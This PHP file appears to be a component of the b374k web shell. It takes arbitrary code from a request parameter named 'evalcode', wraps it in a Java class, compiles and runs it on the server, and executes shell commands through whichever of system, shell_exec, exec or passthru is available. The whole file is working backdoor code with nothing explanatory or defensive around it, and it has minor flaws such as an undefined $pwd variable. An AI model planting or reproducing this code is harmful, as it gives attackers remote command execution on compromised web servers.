<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	elseif(is_callable('shell_exec'))
		$out = shell_exec($c);
	elseif(is_callable('exec')) 
		exec($c,$r);	
	elseif(is_callable('passthru')) {
		ob_start();
		passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

$code = $_REQUEST['evalcode'];
$tmpdir = getcwd();
$rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
$script = $rand;
$code = "class ".$rand." { ".$code . " } ";

chdir($tmpdir);
file_put_contents($script.".java", $code);
				
$res = exe("javac ".$script.".java");
					
$res .= exe("java ".$script);
unlink($script.".class");

unlink($script.".java");
chdir($pwd);
?>